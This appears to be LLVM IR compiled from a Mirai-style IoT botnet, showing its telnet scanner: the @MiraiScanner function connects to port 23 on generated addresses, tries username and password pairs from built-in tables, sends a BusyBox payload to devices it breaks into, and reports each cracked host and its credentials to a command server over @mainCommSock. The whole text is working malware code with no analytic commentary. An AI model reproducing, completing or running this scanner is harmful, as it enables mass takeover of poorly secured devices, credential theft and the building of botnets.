; <label>:682:                                    ; preds = %647
  %683 = load i32, i32* %6, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %684
  call void @reset_telstate(%struct.telstate_t* %685)
  br label %882

; <label>:686:                                    ; preds = %647
  %687 = load i32, i32* @mainCommSock, align 4
  %688 = load i32, i32* %6, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %689
  %691 = call i8* @get_telstate_host(%struct.telstate_t* %690)
  %692 = load i32, i32* %6, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %693
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %694, i32 0, i32 4
  %696 = load i8, i8* %695, align 2
  %697 = zext i8 %696 to i64
  %698 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %697
  %699 = load i8*, i8** %698, align 8
  %700 = load i32, i32* %6, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 5
  %704 = load i8, i8* %703, align 1
  %705 = zext i8 %704 to i64
  %706 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %705
  %707 = load i8*, i8** %706, align 8
  %708 = call i32 (i32, i8*, ...) @sockprintf(i32 %687, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.506, i32 0, i32 0), i8* %691, i8* %699, i8* %707)
  %709 = load i32, i32* %6, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %710
  call void @advance_telstate(%struct.telstate_t* %711, i32 8)
  br label %881

; <label>:712:                                    ; preds = %90
  %713 = call i64 @time(i64* null) #5
  %714 = trunc i64 %713 to i32
  %715 = load i32, i32* %6, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 7
  store i32 %714, i32* %718, align 16
  %719 = load i32, i32* %6, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 0
  %723 = load i32, i32* %722, align 16
  %724 = call i64 @send(i32 %723, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i32 0, i32 0), i64 4, i32 16384)
  %725 = icmp slt i64 %724, 0
  br i1 %725, label %726, label %727

; <label>:726:                                    ; preds = %712
  br label %727

; <label>:727:                                    ; preds = %726, %712
  %728 = load i32, i32* %6, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 0
  %732 = load i32, i32* %731, align 16
  %733 = call i64 @send(i32 %732, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.508, i32 0, i32 0), i64 7, i32 16384)
  %734 = icmp slt i64 %733, 0
  br i1 %734, label %735, label %736

; <label>:735:                                    ; preds = %727
  br label %736

; <label>:736:                                    ; preds = %735, %727
  %737 = load i32, i32* %6, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 0
  %741 = load i32, i32* %740, align 16
  %742 = load i8*, i8** @Busybox_Payload, align 8
  %743 = load i8*, i8** @Busybox_Payload, align 8
  %744 = call i64 @strlen(i8* %743) #9
  %745 = call i64 @send(i32 %741, i8* %742, i64 %744, i32 16384)
  %746 = icmp slt i64 %745, 0
  br i1 %746, label %747, label %751

; <label>:747:                                    ; preds = %736
  %748 = load i32, i32* %6, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %749
  call void @reset_telstate(%struct.telstate_t* %750)
  br label %882

; <label>:751:                                    ; preds = %736
  %752 = load i32, i32* @mainCommSock, align 4
  %753 = load i32, i32* %6, align 4
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %754
  %756 = call i8* @get_telstate_host(%struct.telstate_t* %755)
  %757 = load i32, i32* %6, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 4
  %761 = load i8, i8* %760, align 2
  %762 = zext i8 %761 to i64
  %763 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %762
  %764 = load i8*, i8** %763, align 8
  %765 = load i32, i32* %6, align 4
  %766 = sext i32 %765 to i64
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %766
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %767, i32 0, i32 5
  %769 = load i8, i8* %768, align 1
  %770 = zext i8 %769 to i64
  %771 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %770
  %772 = load i8*, i8** %771, align 8
  %773 = call i32 (i32, i8*, ...) @sockprintf(i32 %752, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.509, i32 0, i32 0), i8* %756, i8* %764, i8* %772)
  %774 = load i32, i32* %6, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %775
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %776, i32 0, i32 0
  %778 = load i32, i32* %777, align 16
  %779 = load i32, i32* %3, align 4
  %780 = load i32, i32* %6, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %781
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %782, i32 0, i32 9
  %784 = load i8*, i8** %783, align 8
  %785 = call i32 @read_until_response(i32 %778, i32 %779, i8* %784, i32 1024, i8** bitcast ([7 x i8]* @.str.510 to i8**))
  %786 = icmp ne i32 %785, 0
  br i1 %786, label %787, label %835

; <label>:787:                                    ; preds = %751
  %788 = load i32, i32* %6, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %789
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %790, i32 0, i32 9
  %792 = load i8*, i8** %791, align 8
  %793 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %792, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.510, i32 0, i32 0))
  %794 = icmp ne i32 %793, 0
  br i1 %794, label %795, label %834

; <label>:795:                                    ; preds = %787
  %796 = load i32, i32* %6, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %797
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %798, i32 0, i32 3
  %800 = load i8, i8* %799, align 1
  %801 = zext i8 %800 to i32
  %802 = icmp ne i32 %801, 3
  br i1 %802, label %803, label %834

; <label>:803:                                    ; preds = %795
  %804 = load i32, i32* @mainCommSock, align 4
  %805 = load i32, i32* %6, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 1
  %809 = bitcast i32* %808 to %struct.in_addr*
  %810 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %809, i32 0, i32 0
  %811 = load i32, i32* %810, align 4
  %812 = call i8* @inet_ntoa(i32 %811) #5
  %813 = load i32, i32* %6, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %814
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %815, i32 0, i32 4
  %817 = load i8, i8* %816, align 2
  %818 = zext i8 %817 to i64
  %819 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %818
  %820 = load i8*, i8** %819, align 8
  %821 = load i32, i32* %6, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %822
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %823, i32 0, i32 5
  %825 = load i8, i8* %824, align 1
  %826 = zext i8 %825 to i64
  %827 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %826
  %828 = load i8*, i8** %827, align 8
  %829 = call i32 (i32, i8*, ...) @sockprintf(i32 %804, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.511, i32 0, i32 0), i8* %812, i8* %820, i8* %828)
  %830 = load i32, i32* %6, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 3
  store i8 3, i8* %833, align 1
  br label %834

; <label>:834:                                    ; preds = %803, %795, %787
  br label %835

; <label>:835:                                    ; preds = %834, %751
  %836 = load i32, i32* %6, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %838, i32 0, i32 7
  %840 = load i32, i32* %839, align 16
  %841 = add i32 %840, 10
  %842 = zext i32 %841 to i64
  %843 = call i64 @time(i64* null) #5
  %844 = icmp slt i64 %842, %843
  br i1 %844, label %845, label %880

; <label>:845:                                    ; preds = %835
  %846 = load i32, i32* %6, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %847
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %848, i32 0, i32 3
  %850 = load i8, i8* %849, align 1
  %851 = zext i8 %850 to i32
  %852 = icmp ne i32 %851, 3
  br i1 %852, label %853, label %876

; <label>:853:                                    ; preds = %845
  %854 = load i32, i32* @mainCommSock, align 4
  %855 = load i32, i32* %6, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %856
  %858 = call i8* @get_telstate_host(%struct.telstate_t* %857)
  %859 = load i32, i32* %6, align 4
  %860 = sext i32 %859 to i64
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %860
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %861, i32 0, i32 4
  %863 = load i8, i8* %862, align 2
  %864 = zext i8 %863 to i64
  %865 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %864
  %866 = load i8*, i8** %865, align 8
  %867 = load i32, i32* %6, align 4
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %868
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %869, i32 0, i32 5
  %871 = load i8, i8* %870, align 1
  %872 = zext i8 %871 to i64
  %873 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %872
  %874 = load i8*, i8** %873, align 8
  %875 = call i32 (i32, i8*, ...) @sockprintf(i32 %854, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.512, i32 0, i32 0), i8* %858, i8* %866, i8* %874)
  br label %876

; <label>:876:                                    ; preds = %853, %845
  %877 = load i32, i32* %6, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %878
  call void @reset_telstate(%struct.telstate_t* %879)
  br label %880

; <label>:880:                                    ; preds = %876, %835
  br label %881

; <label>:881:                                    ; preds = %880, %686, %629, %526, %484, %429, %387, %335, %232, %90
  br label %882

; <label>:882:                                    ; preds = %881, %747, %682, %643, %614, %522, %510, %469, %425, %413, %372, %316, %312, %197, %166, %153
  %883 = load i32, i32* %6, align 4
  %884 = add nsw i32 %883, 1
  store i32 %884, i32* %6, align 4
  br label %72

; <label>:885:                                    ; preds = %72
  br label %70
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @MiraiScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %27, %28
  br i1 %29, label %30, label %32

; <label>:30:                                     ; preds = %2
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %5, align 4
  br label %32

; <label>:32:                                     ; preds = %30, %2
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = call zeroext i16 @htons(i16 zeroext 23) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = call noalias i8* @malloc(i64 1025) #5
  store i8* %38, i8** %17, align 8
  %39 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 1025, i32 1, i1 false)
  %40 = load i32, i32* %5, align 4
  %41 = zext i32 %40 to i64
  %42 = call i8* @llvm.stacksave()
  store i8* %42, i8** %19, align 8
  %43 = alloca %struct.telstate_t, i64 %41, align 16
  %44 = bitcast %struct.telstate_t* %43 to i8*
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 5
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 %47, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %48

; <label>:48:                                     ; preds = %66, %32
  %49 = load i32, i32* %6, align 4
  %50 = load i32, i32* %5, align 4
  %51 = icmp slt i32 %49, %50
  br i1 %51, label %52, label %69

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %6, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %54
  %56 = bitcast %struct.telstate_t* %55 to i8*
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 32, i32 16, i1 false)
  %57 = load i32, i32* %6, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %58
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 3
  store i8 1, i8* %60, align 1
  %61 = load i8*, i8** %17, align 8
  %62 = load i32, i32* %6, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %63
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i32 0, i32 9
  store i8* %61, i8** %65, align 8
  br label %66

; <label>:66:                                     ; preds = %52
  %67 = load i32, i32* %6, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %6, align 4
  br label %48

; <label>:69:                                     ; preds = %48
  br label %70

; <label>:70:                                     ; preds = %879, %69
  br label %71

; <label>:71:                                     ; preds = %70
  store i32 0, i32* %6, align 4
  br label %72

; <label>:72:                                     ; preds = %876, %71
  %73 = load i32, i32* %6, align 4
  %74 = load i32, i32* %5, align 4
  %75 = icmp slt i32 %73, %74
  br i1 %75, label %76, label %879

; <label>:76:                                     ; preds = %72
  %77 = load i32, i32* %6, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %79, i32 0, i32 7
  %81 = load i32, i32* %80, align 16
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %90

; <label>:83:                                     ; preds = %76
  %84 = call i64 @time(i64* null) #5
  %85 = trunc i64 %84 to i32
  %86 = load i32, i32* %6, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %87
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %88, i32 0, i32 7
  store i32 %85, i32* %89, align 16
  br label %90

; <label>:90:                                     ; preds = %83, %76
  %91 = load i32, i32* %6, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 2
  %95 = load i8, i8* %94, align 8
  %96 = zext i8 %95 to i32
  switch i32 %96, label %875 [
    i32 0, label %97
    i32 1, label %233
    i32 2, label %338
    i32 3, label %390
    i32 4, label %435
    i32 5, label %487
    i32 6, label %532
    i32 7, label %632
    i32 8, label %714
  ]

; <label>:97:                                     ; preds = %90
  %98 = load i32, i32* %6, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %99
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %100, i32 0, i32 3
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 1
  br i1 %104, label %105, label %125

; <label>:105:                                    ; preds = %97
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %107
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %108, i32 0, i32 9
  %110 = load i8*, i8** %109, align 8
  store i8* %110, i8** %20, align 8
  %111 = load i32, i32* %6, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %112
  %114 = bitcast %struct.telstate_t* %113 to i8*
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 32, i32 16, i1 false)
  %115 = load i8*, i8** %20, align 8
  %116 = load i32, i32* %6, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 9
  store i8* %115, i8** %119, align 8
  %120 = call i32 @MiraiIPRanges()
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 1
  store i32 %120, i32* %124, align 4
  br label %173

; <label>:125:                                    ; preds = %97
  %126 = load i32, i32* %6, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 3
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %172

; <label>:133:                                    ; preds = %125
  %134 = load i32, i32* %6, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = add i8 %138, 1
  store i8 %139, i8* %137, align 2
  %140 = load i32, i32* %6, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 5
  %144 = load i8, i8* %143, align 1
  %145 = add i8 %144, 1
  store i8 %145, i8* %143, align 1
  %146 = load i32, i32* %6, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %147
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %148, i32 0, i32 5
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i64
  %152 = icmp eq i64 %151, 35
  br i1 %152, label %153, label %158

; <label>:153:                                    ; preds = %133
  %154 = load i32, i32* %6, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 3
  store i8 1, i8* %157, align 1
  br label %158

; <label>:158:                                    ; preds = %153, %133
  %159 = load i32, i32* %6, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %160
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %161, i32 0, i32 4
  %163 = load i8, i8* %162, align 2
  %164 = zext i8 %163 to i64
  %165 = icmp eq i64 %164, 34
  br i1 %165, label %166, label %171

; <label>:166:                                    ; preds = %158
  %167 = load i32, i32* %6, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 3
  store i8 1, i8* %170, align 1
  br label %876

; <label>:171:                                    ; preds = %158
  br label %172

; <label>:172:                                    ; preds = %171, %125
  br label %173

; <label>:173:                                    ; preds = %172, %105
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %174, align 4
  %175 = call zeroext i16 @htons(i16 zeroext 23) #10
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %175, i16* %176, align 2
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %178 = getelementptr inbounds [8 x i8], [8 x i8]* %177, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %178, i8 0, i64 8, i32 4, i1 false)
  %179 = load i32, i32* %6, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %185 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %184, i32 0, i32 0
  store i32 %183, i32* %185, align 4
  %186 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %187 = load i32, i32* %6, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 0
  store i32 %186, i32* %190, align 16
  %191 = load i32, i32* %6, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %192
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %193, i32 0, i32 0
  %195 = load i32, i32* %194, align 16
  %196 = icmp eq i32 %195, -1
  br i1 %196, label %197, label %198

; <label>:197:                                    ; preds = %173
  br label %876

; <label>:198:                                    ; preds = %173
  %199 = load i32, i32* %6, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %200
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %201, i32 0, i32 0
  %203 = load i32, i32* %202, align 16
  %204 = load i32, i32* %6, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 0
  %208 = load i32, i32* %207, align 16
  %209 = call i32 (i32, i32, ...) @fcntl(i32 %208, i32 3, i8* null)
  %210 = or i32 %209, 2048
  %211 = call i32 (i32, i32, ...) @fcntl(i32 %203, i32 4, i32 %210)
  %212 = load i32, i32* %6, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %213
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 16
  %217 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %218 = call i32 @connect(i32 %216, %struct.sockaddr* %217, i32 16)
  %219 = icmp eq i32 %218, -1
  br i1 %219, label %220, label %228

; <label>:220:                                    ; preds = %198
  %221 = call i32* @__errno_location() #10
  %222 = load i32, i32* %221, align 4
  %223 = icmp ne i32 %222, 115
  br i1 %223, label %224, label %228

; <label>:224:                                    ; preds = %220
  %225 = load i32, i32* %6, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %226
  call void @reset_telstate(%struct.telstate_t* %227)
  br label %232

; <label>:228:                                    ; preds = %220, %198
  %229 = load i32, i32* %6, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %230
  call void @advance_telstate(%struct.telstate_t* %231, i32 1)
  br label %232

; <label>:232:                                    ; preds = %228, %224
  br label %875

; <label>:233:                                    ; preds = %90
  br label %234

; <label>:234:                                    ; preds = %233
  %235 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %236 = getelementptr inbounds [16 x i64], [16 x i64]* %235, i64 0, i64 0
  %237 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %236) #5, !srcloc !6
  %238 = extractvalue { i64, i64* } %237, 0
  %239 = extractvalue { i64, i64* } %237, 1
  %240 = trunc i64 %238 to i32
  store i32 %240, i32* %21, align 4
  %241 = ptrtoint i64* %239 to i64
  %242 = trunc i64 %241 to i32
  store i32 %242, i32* %22, align 4
  br label %243

; <label>:243:                                    ; preds = %234
  br label %244

; <label>:244:                                    ; preds = %243
  %245 = load i32, i32* %6, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %246
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %247, i32 0, i32 0
  %249 = load i32, i32* %248, align 16
  %250 = srem i32 %249, 64
  %251 = zext i32 %250 to i64
  %252 = shl i64 1, %251
  %253 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %254 = load i32, i32* %6, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %255
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 16
  %259 = sdiv i32 %258, 64
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds [16 x i64], [16 x i64]* %253, i64 0, i64 %260
  %262 = load i64, i64* %261, align 8
  %263 = or i64 %262, %252
  store i64 %263, i64* %261, align 8
  %264 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %264, align 8
  %265 = load i32, i32* %3, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %266, i64* %267, align 8
  %268 = load i32, i32* %6, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 16
  %273 = add nsw i32 %272, 1
